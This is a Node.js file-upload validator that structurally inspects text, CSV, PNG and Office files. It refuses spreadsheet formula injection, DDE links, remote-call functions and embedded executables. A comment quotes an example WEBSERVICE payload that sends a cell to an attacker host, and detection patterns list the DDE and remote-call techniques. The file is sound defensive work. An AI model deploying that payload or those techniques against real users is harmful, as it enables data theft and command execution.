import { createHash } from "node:crypto";
import { crc32, inflateRawSync, inflateSync } from "node:zlib";
import { SaxesParser } from "saxes";
import { inspectPrivateRaster } from "./privateFileRaster.js";

export const PRIVATE_FILE_MAX_BYTES = 10 * 1024 * 1024;
const MAX_EXPANDED_BYTES = 25 * 1024 * 1024;
const PNG_SIGNATURE = Buffer.from("89504e470d0a1a0a", "hex");
const DOCX = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
const XLSX = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
const EXTENSIONS = new Map([
  ["text/plain", ["txt"]], ["text/csv", ["csv"]], ["image/png", ["png"]],
  ["image/jpeg", ["jpg", "jpeg"]], ["image/webp", ["webp"]],
  ["application/pdf", ["pdf"]],
  [DOCX, ["docx"]], [XLSX, ["xlsx"]],
]);

function reject(reason) { throw new Error(`private-file-${reason}`); }

function executable(bytes) {
  return bytes.subarray(0, 2).equals(Buffer.from("MZ"))
    || bytes.subarray(0, 2).equals(Buffer.from("#!"))
    || ["7f454c46", "feedface", "cefaedfe", "feedfacf", "cffaedfe", "cafebabe", "bebafeca"]
      .includes(bytes.subarray(0, 4).toString("hex"));
}

function utf8(bytes) {
  let value;
  try { value = new TextDecoder("utf-8", { fatal: true }).decode(bytes); }
  catch { reject("text-encoding"); }
  for (const character of value) {
    const code = character.charCodeAt(0);
    if ((code < 32 && ![9, 10, 13].includes(code)) || code === 127) reject("text-control");
  }
  return value;
}

// CSV AND TXT ARE SPREADSHEET INPUTS, NOT PROSE.
//
// A `.csv` reaches a staff recipient who opens it in Excel, Numbers or
// LibreOffice, and every one of them evaluates a cell that begins with `=`,
// `+`, `-` or `@` as a formula. That is enough to reach the network
// (`=WEBSERVICE("https://attacker.invalid/?x="&A1)` exfiltrates the neighbouring
// cell on open) or to raise a DDE prompt that runs a local command. The XLSX
// path already refuses exactly these classes inside `<f>`, `<definedName>`,
// `ddeLink` and `oleLink`; a CSV carrying the same expression was reaching the
// ledger with a clean structural verdict purely because it was "text".
//
// The rule, and it is deliberately a REFUSAL rather than a sanitisation —
// rewriting a member's file would change bytes the digest and the scanner are
// bound to:
//
//   * a cell whose first character (after the CSV quoting and any leading tab
//     or carriage return, which spreadsheets ignore when they classify a cell)
//     is `=`, `+`, `-` or `@` is refused, UNLESS the whole cell is a plain
//     numeric literal — `-5`, `+1.5`, `-1,200.00`, `+2e9` are data, and
//     refusing those would reject most real financial exports;
//   * a DDE-style `application|topic!item` link or a remote-call function
//     (`WEBSERVICE`, the `IMPORT*` family, `RTD`, `DDE`) anywhere in the text
//     is refused outright, which is the same expression set the XLSX inspector
//     rejects; so is `IMAGE(` followed by a quoted outside address.
//
// WHY THE CELL-LEAD RULE IS `text/csv` ONLY.
//
// A `.csv` is a spreadsheet by declaration: every cell in it is classified by
// the application that opens it, so a leading `-` there is a formula lead
// worth refusing. A `.txt` is not — it is prose, and an ordinary note whose
// line begins with a bare `-` or `+` bullet is the common case, not the
// attack. Refusing those would be a STRUCTURAL rejection, which the ledger
// records as `blocked`: a permanent decision about those bytes that no
// re-upload can undo. Paying that with a member's meeting notes buys nothing,
// because the expressions that actually reach the network or raise a DDE
// prompt are caught by the second rule, which still runs over `text/plain`.
//
// Cells are delimited by comma, semicolon and tab for `text/csv`. Everything
// is one bounded forward pass: no backtracking-prone pattern is applied to the
// whole file.
const FORMULA_LEAD = new Set(["=", "+", "-", "@"]);
const CELL_QUOTING = /^["\t\r]+|["\t\r]+$/g;
const NUMERIC_CELL = /^[+-]?(?:\d{1,3}(?:,\d{3})*(?:\.\d*)?|\d+(?:\.\d*)?|\.\d+)(?:[eE][+-]?\d{1,4})?$/;
// Bounded and unambiguous: the inner class excludes both delimiters, so there
// is nothing to backtrack over on a large input.
const DDE_LINK = /\|[^|!\r\n]{0,256}![A-Za-z0-9_$]/;
// The one remote-call list: inspectDelimitedText and the XLSX formula check in
// inspectOfficeXml both test it, matched on the function name. Both test it
// after whitespace runs are squeezed to one space, so a long run before the
// `(` cannot step past the bounded gap (record #9542).
const REMOTE_CALL = /\b(?:WEBSERVICE|IMPORTXML|IMPORTDATA|IMPORTHTML|IMPORTFEED|IMPORTRANGE|RTD|DDE)\s{0,16}\(/i;
// IMAGE fetches a picture from the address it is given (record #9542). In
// workbook code every IMAGE call is refused, because the address can come from
// a cell. In text it is refused when a quoted outside address follows, because
// a note that says "image (attached)" is prose, not a call.
const IMAGE_CALL = /\bIMAGE ?\(/i;
const IMAGE_ADDRESS = /\bIMAGE ?\( ?"{1,4} ?(?:[a-z][a-z0-9+.-]{0,31}:\/\/|\/\/|www\.)/i;
// A numeric literal is short; anything longer than this cannot be one, so the
// exemption never slices an unbounded window out of the file.
const MAX_NUMERIC_CELL = 64;

// The code of a workbook formula with its quoted tokens taken out: a "string"
// literal or a 'sheet name' is data, so `"RTD("` as a HYPERLINK argument is not
// a call. A doubled quote escapes itself inside its token. An unterminated
// quote fails closed: the rest of the text stays in as code. One forward pass.
function formulaCode(formula) {
  const parts = [];
  let start = 0;
  let index = 0;
  while (index < formula.length) {
    const quote = formula[index];
    if (quote !== "\"" && quote !== "'") { index += 1; continue; }
    let close = formula.indexOf(quote, index + 1);
    while (close !== -1 && formula[close + 1] === quote) close = formula.indexOf(quote, close + 2);
    if (close === -1) break;
    parts.push(formula.slice(start, index), " ");
    index = close + 1;
    start = index;
  }
  parts.push(formula.slice(start));
  return parts.join("");
}

// One test for every place a workbook keeps a formula. The DDE pipe test reads
// the raw text; the call tests read the code with quoted tokens skipped and
// whitespace runs squeezed.
function activeWorkbookFormula(formula) {
  if (/\|[\s\S]*!/.test(formula)) return true;
  const code = formulaCode(formula).replace(/\s+/g, " ");
  return REMOTE_CALL.test(code) || IMAGE_CALL.test(code);
}

function activeFormulaCell(value, start, end) {
  let first = start;
  while (first < end && (value[first] === "\"" || value[first] === "\t" || value[first] === "\r")) first += 1;
  if (first >= end || !FORMULA_LEAD.has(value[first])) return false;
  if (end - first > MAX_NUMERIC_CELL) return true;
  return !NUMERIC_CELL.test(value.slice(first, end).replace(CELL_QUOTING, ""));
}

function inspectDelimitedText(value, mimeType) {
  // Both text types: a DDE link or a remote-call function is an active
  // expression whatever the file is called.
  const squeezed = value.replace(/\s+/g, " ");
  if (DDE_LINK.test(value) || REMOTE_CALL.test(squeezed) || IMAGE_ADDRESS.test(squeezed)) reject("text-active-formula");
  // The per-cell lead rule is for declared spreadsheets only. See the note above.
  if (mimeType !== "text/csv") return;
  let cellStart = 0;
  let quoted = false;
  for (let index = 0; index <= value.length; index += 1) {
    // The virtual terminator closes the final cell without a second code path,
    // and it closes it even inside an unterminated quote — a malformed CSV must
    // not be able to hide its last cell behind a stray `"`.
    const end = index === value.length;
    const character = end ? "\n" : value[index];
    if (!end && character === "\"") { quoted = !quoted; continue; }
    if (!end && quoted) continue;
    if (!end && character !== "\n" && character !== "\r" && character !== "\t"
      && character !== "," && character !== ";") continue;
    if (activeFormulaCell(value, cellStart, index)) reject("text-active-formula");
    cellStart = index + 1;
  }
}

function inspectText(bytes, mimeType) {
  if (bytes.subarray(0, 4).equals(Buffer.from("504b0304", "hex"))) reject("mime-mismatch");
  const value = utf8(bytes);
  // Text cannot be used as an alternate MIME for a supported binary container.
  if (/^\s*(?:%PDF-|\{\\rtf)/.test(value)) reject("mime-mismatch");
  inspectDelimitedText(value, mimeType);
}

function inspectPng(bytes, budget) {
  if (!bytes.subarray(0, 8).equals(PNG_SIGNATURE)) reject("mime-mismatch");
  let offset = 8;
  let header;
  let paletteEntries = 0;
  let imageDataEnded = false;
  const compressed = [];
  const singletons = new Set();
  // A deliberately narrow metadata-free PNG profile. Clients can re-encode
  // other images before upload. Unknown ancillary chunks are not trusted.
  while (offset < bytes.length) {
    if (bytes.length - offset < 12) reject("image-truncated");
    const size = bytes.readUInt32BE(offset);
    if (size > bytes.length - offset - 12) reject("image-truncated");
    const type = bytes.toString("ascii", offset + 4, offset + 8);
    const data = bytes.subarray(offset + 8, offset + 8 + size);
    if (crc32(bytes.subarray(offset + 4, offset + 8 + size)) !== bytes.readUInt32BE(offset + 8 + size)) {
      reject("image-checksum");
    }
    offset += size + 12;
    if (!["IHDR", "PLTE", "IDAT", "IEND", "tRNS", "sRGB", "gAMA", "cHRM", "pHYs"].includes(type)) {
      reject("image-metadata-or-unsupported-chunk");
    }
    if (type !== "IDAT") {
      if (singletons.has(type)) reject("image-duplicate-chunk");
      singletons.add(type);
      if (compressed.length) imageDataEnded = true;
    }
    if (!header && type !== "IHDR") reject("image-header");
    if (type === "IHDR") {
      if (size !== 13) reject("image-header");
      const width = data.readUInt32BE(0);
      const height = data.readUInt32BE(4);
      const depth = data[8];
      const color = data[9];
      const channels = { 0: 1, 2: 3, 3: 1, 4: 2, 6: 4 }[color];
      const depths = { 0: [1, 2, 4, 8, 16], 2: [8, 16], 3: [1, 2, 4, 8], 4: [8, 16], 6: [8, 16] }[color];
      if (!width || !height || width > 16384 || height > 16384 || !depths?.includes(depth)
        || data[10] !== 0 || data[11] !== 0 || data[12] !== 0) reject("image-profile");
      const rowBytes = Math.ceil(width * channels * depth / 8);
      const expandedSize = (rowBytes + 1) * height;
      if (expandedSize > budget.remaining) reject("image-expanded-size");
      budget.remaining -= expandedSize;
      header = { rowBytes, expandedSize, color, depth };
    } else if (type === "PLTE") {
      if (compressed.length || !size || size % 3 || size > 768 || [0, 4].includes(header.color)) reject("image-palette");
      paletteEntries = size / 3;
      if (header.color === 3 && paletteEntries > 2 ** header.depth) reject("image-palette");
    } else if (type === "IDAT") {
      if (imageDataEnded || (header.color === 3 && !paletteEntries)) reject("image-data-order");
      compressed.push(data);
    } else if (type === "IEND") {
      if (size || !compressed.length || offset !== bytes.length) reject("image-trailing-or-missing-data");
      let result;
      try {
        result = inflateSync(Buffer.concat(compressed), { maxOutputLength: header.expandedSize, info: true });
      } catch { reject("image-compression"); }
      if (result.engine.bytesWritten !== compressed.reduce((sum, part) => sum + part.length, 0)) reject("image-compressed-trailing");
      const decoded = result.buffer;
      if (decoded.length !== header.expandedSize) reject("image-data-size");
      for (let row = 0; row < decoded.length; row += header.rowBytes + 1) {
        if (decoded[row] > 4) reject("image-filter");
      }
      return;
    } else {
      if (compressed.length) reject("image-chunk-order");
      if ((type === "sRGB" && (size !== 1 || data[0] > 3))
        || (type === "gAMA" && (size !== 4 || data.readUInt32BE(0) === 0))
        || (type === "cHRM" && size !== 32)
        || (type === "pHYs" && (size !== 9 || data[8] > 1))) reject("image-chunk");
      if (type === "tRNS" && !((header.color === 0 && size === 2)
        || (header.color === 2 && size === 6)
        || (header.color === 3 && paletteEntries && size > 0 && size <= paletteEntries))) reject("image-transparency");
    }
  }
  reject("image-missing-end");
}

// Every element a workbook keeps a formula in (record #9542): cells, names,
// table columns and totals, conditional formatting (`formula`) and data
// validation (`formula1`, `formula2`), which Excel calculates on open, and the
// newer extension markup `xm:f` in its own namespace.
const SHEET_FORMULA_ELEMENTS = new Set(["f", "definedName", "calculatedColumnFormula", "totalsRowFormula", "formula", "formula1", "formula2"]);
const EXTENSION_FORMULA_NAMESPACE = "http://schemas.microsoft.com/office/excel/2006/main";

function inspectOfficeXml(bytes, name) {
  const xml = utf8(bytes);
  const parser = new SaxesParser({ xmlns: true });
  const wordNamespaces = new Set(["http://schemas.openxmlformats.org/wordprocessingml/2006/main", "http://purl.oclc.org/ooxml/wordprocessingml/main"]);
  const sheetNamespaces = new Set(["http://schemas.openxmlformats.org/spreadsheetml/2006/main", "http://purl.oclc.org/ooxml/spreadsheetml/main"]);
  const hyperlinkTypes = new Set(["http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink", "http://purl.oclc.org/ooxml/officeDocument/relationships/hyperlink"]);
  const activeField = /\b(?:DDE(?:AUTO)?|INCLUDE(?:TEXT|PICTURE)|IMPORT|LINK|DATABASE)\b/i;
  let root;
  let instructionDepth = 0;
  let instructionText = "";
  const instructions = [];
  let formulaDepth = 0;
  let formulaText = "";
  parser.on("doctype", () => reject("archive-xml-doctype"));
  parser.on("opentag", (node) => {
    root ??= node;
    const allAttributes = Object.values(node.attributes);
    const attributes = Object.fromEntries(allAttributes.filter((attribute) => !attribute.uri).map((attribute) => [attribute.local, attribute.value]));
    if (allAttributes.some((attribute) => /macroEnabled|vbaProject/i.test(attribute.value))) reject("archive-executable");
    if (node.local === "Relationship" && node.uri === "http://schemas.openxmlformats.org/package/2006/relationships") {
      if (allAttributes.some((attribute) => attribute.uri && attribute.uri !== "http://www.w3.org/2000/xmlns/")
        || (attributes.TargetMode?.toLowerCase() === "external" && !hyperlinkTypes.has(attributes.Type))) reject("archive-active-relationship");
    }
    if (wordNamespaces.has(node.uri) && node.local === "fldSimple"
      && allAttributes.some((attribute) => attribute.local === "instr" && activeField.test(attribute.value))) reject("archive-active-field");
    if (instructionDepth || (wordNamespaces.has(node.uri) && node.local === "instrText")) instructionDepth += 1;
    const sheetElement = sheetNamespaces.has(node.uri);
    if (sheetElement && ["ddeLink", "oleLink"].includes(node.local)) reject("archive-active-formula");
    // A data connection (a web query, a database, a text import, a Power Query
    // or data-model source) fetches from where it names on refresh, and can
    // refresh on open. The inspector cannot tell an outside source from its
    // markup alone, so every connection is refused (record #9542).
    if (sheetElement && node.local === "connection") reject("archive-active-connection");
    // A pivot calculated field or item keeps its formula in an attribute.
    if (sheetElement && typeof attributes.formula === "string"
      && activeWorkbookFormula(attributes.formula)) reject("archive-active-formula");
    if (formulaDepth || (sheetElement && SHEET_FORMULA_ELEMENTS.has(node.local))
      || (node.uri === EXTENSION_FORMULA_NAMESPACE && node.local === "f")) formulaDepth += 1;
  });
  parser.on("closetag", () => {
    if (instructionDepth) {
      instructionDepth -= 1;
      if (!instructionDepth) { instructions.push(instructionText); instructionText = ""; }
    }
    if (formulaDepth) {
      formulaDepth -= 1;
      if (!formulaDepth) {
        // REMOTE_CALL is the one remote-call list the CSV rule uses too, so the
        // two rules cannot drift apart (record #9500). The word boundary also
        // matches the `_xlfn.` and `_xlfn._xlws.` prefixes a workbook stores.
        // See activeWorkbookFormula for the quoted-token and whitespace rules.
        if (activeWorkbookFormula(formulaText)) reject("archive-active-formula");
        formulaText = "";
      }
    }
  });
  const text = (value) => {
    if (instructionDepth) instructionText += value;
    if (formulaDepth) formulaText += value;
  };
  parser.on("text", text);
  parser.on("cdata", text);
  try { parser.write(xml).close(); }
  catch (error) {
    if (/^private-file-archive-[a-z-]+$/.test(error?.message)) throw error;
    reject("archive-xml");
  }
  if (instructions.some((instruction) => activeField.test(instruction)) || activeField.test(instructions.join(""))) reject("archive-active-field");
  const canonical = name.toLowerCase();
  if (canonical === "word/document.xml" && (root?.local !== "document" || !wordNamespaces.has(root.uri))) reject("archive-document-root");
  if (canonical === "xl/workbook.xml" && (root?.local !== "workbook"
    || !["http://schemas.openxmlformats.org/spreadsheetml/2006/main", "http://purl.oclc.org/ooxml/spreadsheetml/main"].includes(root.uri))) reject("archive-document-root");
  if (canonical === "[content_types].xml" && (root?.local !== "Types" || root.uri !== "http://schemas.openxmlformats.org/package/2006/content-types")) reject("archive-document-root");
  if (canonical.endsWith(".rels") && (root?.local !== "Relationships" || root.uri !== "http://schemas.openxmlformats.org/package/2006/relationships")) reject("archive-document-root");
}

async function inspectOffice(bytes, mimeType, budget) {
  // No generic ZIPs, comments, multi-disk files, ZIP64, encryption, hidden gaps
  // or unbounded extraction. Every local member must match the directory.
  const end = bytes.length - 22;
  if (end < 0 || bytes.readUInt32LE(end) !== 0x06054b50 || bytes.readUInt16LE(end + 20)
    || bytes.readUInt16LE(end + 4) || bytes.readUInt16LE(end + 6)) reject("archive-end");
  const count = bytes.readUInt16LE(end + 10);
  const directory = bytes.readUInt32LE(end + 16);
  if (!count || count > 2000 || bytes.readUInt16LE(end + 8) !== count
    || directory + bytes.readUInt32LE(end + 12) !== end) reject("archive-directory");
  const members = new Map();
  let cursor = directory;
  let local = 0;
  for (let index = 0; index < count; index += 1) {
    if (cursor + 46 > end || bytes.readUInt32LE(cursor) !== 0x02014b50) reject("archive-directory");
    const flags = bytes.readUInt16LE(cursor + 8);
    const method = bytes.readUInt16LE(cursor + 10);
    const checksum = bytes.readUInt32LE(cursor + 16);
    const packed = bytes.readUInt32LE(cursor + 20);
    const size = bytes.readUInt32LE(cursor + 24);
    const nameSize = bytes.readUInt16LE(cursor + 28);
    const extraSize = bytes.readUInt16LE(cursor + 30);
    const commentSize = bytes.readUInt16LE(cursor + 32);
    const localOffset = bytes.readUInt32LE(cursor + 42);
    if (cursor + 46 + nameSize + extraSize + commentSize > end || !nameSize || commentSize
      || flags & ~0x0800 || ![0, 8].includes(method) || bytes.readUInt16LE(cursor + 34)
      || localOffset !== local || ((bytes.readUInt32LE(cursor + 38) >>> 16) & 0xf000) === 0xa000) reject("archive-member");
    const nameBytes = bytes.subarray(cursor + 46, cursor + 46 + nameSize);
    const name = nameBytes.toString("utf8");
    // Restrict package paths to canonical ASCII; case-fold to reject aliases.
    if (!/^[a-zA-Z0-9_[\]. /-]+$/.test(name) || name.split("/").some((part, i, parts) =>
      part === "." || part === ".." || (!part && i !== parts.length - 1) || part.endsWith(" "))
      || members.has(name.toLowerCase()) || /(?:vba|activex|embeddings)(?:[/.]|project)/i.test(name)
      || /\.(?:exe|dll|com|scr|bat|cmd|ps1|sh|js|vbs|bin|jar|zip)$/i.test(name)) reject("archive-executable-or-path");
    if (size > budget.remaining || packed > PRIVATE_FILE_MAX_BYTES
      || local + 30 > directory || bytes.readUInt32LE(local) !== 0x04034b50) reject("archive-size");
    budget.remaining -= size;
    const localExtra = bytes.readUInt16LE(local + 28);
    const dataStart = local + 30 + nameSize + localExtra;
    if (dataStart + packed > directory || bytes.readUInt16LE(local + 6) !== flags
      || bytes.readUInt16LE(local + 8) !== method || bytes.readUInt32LE(local + 14) !== checksum
      || bytes.readUInt32LE(local + 18) !== packed || bytes.readUInt32LE(local + 22) !== size
      || bytes.readUInt16LE(local + 26) !== nameSize
      || !bytes.subarray(local + 30, local + 30 + nameSize).equals(nameBytes)) reject("archive-local-mismatch");
    const input = bytes.subarray(dataStart, dataStart + packed);
    let decoded = input;
    if (method === 8) {
      let result;
      try {
        result = inflateRawSync(input, { maxOutputLength: Math.max(size, 1), info: true });
      } catch { reject("archive-compression"); }
      if (result.engine.bytesWritten !== packed) reject("archive-compressed-trailing");
      decoded = result.buffer;
    }
    if (decoded.length !== size || crc32(decoded) !== checksum) reject("archive-checksum-or-size");
    if (executable(decoded)) reject("archive-executable");
    if (/\.(xml|rels)$/i.test(name)) {
      inspectOfficeXml(decoded, name);
    } else if (!name.endsWith("/")) {
      // Embedded files require the same inspection as top-level uploads.
      // Other embedded formats stay unavailable until a bounded validator exists.
      if (/\.png$/i.test(name)) inspectPng(decoded, budget);
      else if (/\.jpe?g$/i.test(name)) await inspectPrivateRaster(decoded, "jpeg", budget);
      else if (/\.webp$/i.test(name)) await inspectPrivateRaster(decoded, "webp", budget);
      else reject("archive-unsupported-member");
    } else if (size) reject("archive-directory-data");
    members.set(name.toLowerCase(), decoded);
    local = dataStart + packed;
    cursor += 46 + nameSize + extraSize + commentSize;
  }
  if (local !== directory || cursor !== end) reject("archive-hidden-data");
  const main = mimeType === DOCX ? "word/document.xml" : "xl/workbook.xml";
  const otherMain = mimeType === DOCX ? "xl/workbook.xml" : "word/document.xml";
  if (!members.has("[content_types].xml") || !members.has("_rels/.rels")
    || !members.has(main) || members.has(otherMain)) reject("archive-mime-mismatch");
}

/** Inspect the exact stored bytes. This is NOT a malware verdict. Unsupported
 * formats fail closed until their bounded validator is implemented. Scanning,
 * freshness and object-identity binding must all pass before granting access. */
export async function inspectPrivateFileBytes(input, { filename, mimeType, expectedSize } = {}) {
  if (!(input instanceof Uint8Array)) reject("size-invalid-input");
  const bytes = Buffer.from(input.buffer, input.byteOffset, input.byteLength);
  if (!bytes.length || bytes.length > PRIVATE_FILE_MAX_BYTES || !Number.isSafeInteger(expectedSize)
    || expectedSize !== bytes.length) reject("size-mismatch");
  if (executable(bytes)) reject("executable");
  const extensions = EXTENSIONS.get(mimeType);
  if (!extensions || typeof filename !== "string" || filename.length > 255
    || !filename.includes(".") || /[/\\]/.test(filename)
    || [...filename].some((character) => character.charCodeAt(0) < 32 || character.charCodeAt(0) === 127)
    || !extensions.includes(filename.split(".").at(-1)?.toLowerCase())) reject("mime-or-extension");
  const budget = { remaining: MAX_EXPANDED_BYTES };
  if (mimeType === "image/png") inspectPng(bytes, budget);
  else if (mimeType === "application/pdf") {
    const { inspectPrivatePdf } = await import("./privateFilePdf.js");
    await inspectPrivatePdf(bytes, budget);
  }
  else if (mimeType === "image/jpeg" || mimeType === "image/webp") await inspectPrivateRaster(bytes, mimeType.slice(6), budget);
  else if (mimeType === DOCX || mimeType === XLSX) await inspectOffice(bytes, mimeType, budget);
  else inspectText(bytes, mimeType);
  return { profile: "structure-only", mimeType, sizeBytes: bytes.length, sha256: createHash("sha256").update(bytes).digest("hex") };
}
